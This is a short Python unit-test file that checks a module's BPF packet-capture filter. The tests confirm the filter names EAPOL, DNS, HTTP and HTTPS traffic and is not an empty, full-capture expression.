class TestTheFilterIsTheTableAndNoMore(unittest.TestCase):
    """One BPF expression, narrow on purpose: a second reader on 13 W."""

    def test_the_filter_names_every_protocol_the_evidence_reads(self):
        for needle in ("0x888e", "port 53", "port 80", "port 443"):
            self.assertIn(needle, evidence_mod.BPF_FILTER)

    def test_the_filter_is_not_a_full_capture(self):
        self.assertNotEqual(evidence_mod.BPF_FILTER.strip(), "")


if __name__ == "__main__":
    unittest.main()
